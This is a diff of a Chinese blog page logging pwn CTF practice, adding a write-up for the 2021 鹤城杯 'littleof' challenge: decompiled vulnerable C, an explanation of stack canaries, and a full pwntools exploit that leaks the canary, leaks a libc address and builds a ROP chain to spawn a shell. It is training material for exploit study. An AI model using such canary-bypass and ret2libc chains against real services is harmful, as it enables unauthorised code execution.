@@ -24,7 +24,7 @@
 
   <meta name="description" content="栈问题get_started_3dsctf_2016checksec 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)    123456789101112131415161718192021222">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buuctf刷题记录">
+<meta property="og:title" content="pwn日常刷题记录">
 <meta property="og:url" content="http://example.com/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="fanfan&#39;s blog">
 <meta property="og:description" content="栈问题get_started_3dsctf_2016checksec 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)    123456789101112131415161718192021222">
@@ -32,8 +32,9 @@
 <meta property="og:image" content="http://example.com/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095347-1678706371578-4.png">
 <meta property="og:image" content="http://example.com/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095410.png">
 <meta property="og:image" content="http://example.com/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095400.png">
+<meta property="og:image" content="http://example.com/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-14%20200914.png">
 <meta property="article:published_time" content="2023-03-07T12:22:58.000Z">
-<meta property="article:modified_time" content="2023-03-13T11:19:47.752Z">
+<meta property="article:modified_time" content="2023-03-14T13:07:06.693Z">
 <meta property="article:author" content="fan fan">
 <meta property="article:tag" content="刷题">
 <meta name="twitter:card" content="summary">
@@ -52,7 +53,7 @@
   };
 </script>
 
-  <title>buuctf刷题记录 | fanfan's blog</title>
+  <title>pwn日常刷题记录 | fanfan's blog</title>
   
 
 
@@ -133,7 +134,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">4</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">5</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -143,7 +144,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">6</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -214,7 +215,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          buuctf刷题记录
+          pwn日常刷题记录
         </h1>
 
         <div class="post-meta">
@@ -231,7 +232,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-13 19:19:47" itemprop="dateModified" datetime="2023-03-13T19:19:47+08:00">2023-03-13</time>
+                <time title="修改时间：2023-03-14 21:07:06" itemprop="dateModified" datetime="2023-03-14T21:07:06+08:00">2023-03-14</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -321,6 +322,33 @@
 <p>#libc<br>base_addr &#x3D; read_addr - libc.symbols[‘read’]<br>system_addr &#x3D; base_addr + libc.symbols[‘system’]<br>bin_sh_addr &#x3D; base_addr + next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>print(“system_addr: “ + (hex(system_addr)))<br>print(“bin_sh_addr: “ + (hex(bin_sh_addr)))</p>
 <p>#attack2<br>payload&#x3D;b’M’*(0x20+8) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)<br>r.recv()<br>r.sendline(payload)</p>
 <p>r.interactive()</p>
+<h2 id="2021-鹤城杯-littleof"><a href="#2021-鹤城杯-littleof" class="headerlink" title="[2021 鹤城杯]littleof"></a>[2021 鹤城杯]littleof</h2><p><strong>checksec一下</strong></p>
+<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-14%20200914.png"></p>
+<p>发现有canary保护</p>
+<p><strong>ida查看</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4006E2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  FILE *v2; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="built_in">stdin</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know how to do buffer overflow?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s. Try harder!&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hope you win&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很显然栈溢出漏洞位于read函数中，buf大小为0x50，而read函数的第三参数，也就是<strong>输出&#x2F;写入&#x2F;输出</strong>的最大的字节长度为0x100，就是2个buf大小的数据。但是本题开启了Canary，因此我们不能直接进行栈溢出以及Ret2Libc攻击。我们可以发现，我们输入的Payload会被第二段的printf打印出来。也就是说可以利用这个printf打印出来Canary，将Canary原封不动的归位，即可跳过检测。</p>
+<p><strong>canary</strong></p>
+<p>Canary是位于EBP之前的一串随机数据，用来防止栈上的内容溢出进行某些危险攻击的。我们都知道Canary 会在栈上添加一个随机值，以保护程序免受缓冲区溢出攻击，但是也会在栈上多占用一些空间。</p>
+<p>也就是说：</p>
+<p><strong>假如我的 buf 大小为 0x50</strong></p>
+<p><strong>如果是 64 位程序，那么 Canary 就会在栈上额外占用 0x08 的空间作为随机值。</strong></p>
+<p><strong>也就是说 我的可用空间只有 0x42 。</strong></p>
+<p><strong>开启 Canary ： RBP 位于 0x50 + 0x08，Canary位于0x50 - 0x08，Return Address位于0x50 + 0x16</strong></p>
+<p><strong>而 0x50 + 0x08 在不开启 Canary 的情况下是 Return Address 的地址</strong></p>
+<p><strong>关闭 Canary ： RBP 位于 0x50，Return Address位于0x50 + 0x08</strong></p>
+<p><strong>这时候的 0x50 + 0x08 是 Return Address 的地址。</strong></p>
+<p>具体思路如下：</p>
+<p><strong>因为Canary是栈中的一个随机值，我们通过printf泄露Canary，然后将其填充至它本来应该在的位置，就能通过检查。</strong></p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#io = process(&quot;littleof&quot;)</span></span><br><span class="line">io = remote()</span><br><span class="line">elf = ELF(<span class="string">&quot;littleof&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">rdi = <span class="number">0x400863</span></span><br><span class="line">ret = <span class="number">0x40059E</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x400789</span></span><br><span class="line"> </span><br><span class="line">Padding = <span class="string">b&#x27;A&#x27;</span> * ( <span class="number">0x50</span> - <span class="number">0x08</span> )</span><br><span class="line">Padding_Ret = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x08</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> 发送了<span class="number">0x49</span>个字节，总共<span class="number">0x50</span>个字节，程序会把Canary放在变量起始位置，所以只需要接收<span class="number">7</span>个，然后用一个<span class="number">0</span>填充即可。</span><br><span class="line"> Payload_Leak = Padding + p64(Canary) + Padding_Ret + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Leak)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Real Address: &quot;</span> + (<span class="built_in">hex</span>(addr)))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Local</span></span><br><span class="line"><span class="comment">#ibc = LibcSearcher(&#x27;puts&#x27;,addr)</span></span><br><span class="line"><span class="comment">#base = addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment">#system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Remote</span></span><br><span class="line">base = addr - <span class="number">0x080aa0</span></span><br><span class="line">system = base + <span class="number">0x04f550</span></span><br><span class="line">binsh = base + <span class="number">0x1b3e1a</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> </span><br><span class="line">Payload_Shell = Padding + p64(Canary) + Padding_Ret + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Shell)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Padding就是上文泄露Canary的Payload</p>
+<p>Canary就是Canary的数据</p>
+<p>Padding_Ret 代表覆盖原先栈上的 RBP</p>
+<p>Ret 用来平衡栈帧</p>
+<p>Rdi 用来存放 system 的第一个函数，也就是 &#x2F;bin&#x2F;sh 字符串的地址的。</p>
 
     </div>
 
@@ -406,7 +434,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E9%97%AE%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">栈问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">1.1.</span> <span class="nav-text">get_started_3dsctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-babyrop"><span class="nav-number">1.2.</span> <span class="nav-text">[OGeek2019]babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">1.3.</span> <span class="nav-text">jarvisoj_level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-en-2"><span class="nav-number">1.4.</span> <span class="nav-text">ciscn_2019_en_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#not-the-same-3dsctf-2016"><span class="nav-number">1.5.</span> <span class="nav-text">not_the_same_3dsctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-5"><span class="nav-number">1.6.</span> <span class="nav-text">ciscn_2019_n_5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="nav-number">1.7.</span> <span class="nav-text">铁人三项(第五赛区)_2018_rop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop"><span class="nav-number">1.8.</span> <span class="nav-text">bjdctf_2020_babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babystack2"><span class="nav-number">1.9.</span> <span class="nav-text">bjdctf_2020_babystack2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-es-2"><span class="nav-number">1.10.</span> <span class="nav-text">ciscn_2019_es_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn2-sctf-2016"><span class="nav-number">1.11.</span> <span class="nav-text">pwn2_sctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level3"><span class="nav-number">1.12.</span> <span class="nav-text">jarvisoj_level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-baby-rop2"><span class="nav-number">1.13.</span> <span class="nav-text">[HarekazeCTF2019]baby_rop2</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E9%97%AE%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">栈问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">1.1.</span> <span class="nav-text">get_started_3dsctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-babyrop"><span class="nav-number">1.2.</span> <span class="nav-text">[OGeek2019]babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">1.3.</span> <span class="nav-text">jarvisoj_level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-en-2"><span class="nav-number">1.4.</span> <span class="nav-text">ciscn_2019_en_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#not-the-same-3dsctf-2016"><span class="nav-number">1.5.</span> <span class="nav-text">not_the_same_3dsctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-5"><span class="nav-number">1.6.</span> <span class="nav-text">ciscn_2019_n_5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="nav-number">1.7.</span> <span class="nav-text">铁人三项(第五赛区)_2018_rop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop"><span class="nav-number">1.8.</span> <span class="nav-text">bjdctf_2020_babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babystack2"><span class="nav-number">1.9.</span> <span class="nav-text">bjdctf_2020_babystack2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-es-2"><span class="nav-number">1.10.</span> <span class="nav-text">ciscn_2019_es_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn2-sctf-2016"><span class="nav-number">1.11.</span> <span class="nav-text">pwn2_sctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level3"><span class="nav-number">1.12.</span> <span class="nav-text">jarvisoj_level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-baby-rop2"><span class="nav-number">1.13.</span> <span class="nav-text">[HarekazeCTF2019]baby_rop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-littleof"><span class="nav-number">1.14.</span> <span class="nav-text">[2021 鹤城杯]littleof</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -422,7 +450,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -435,7 +463,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
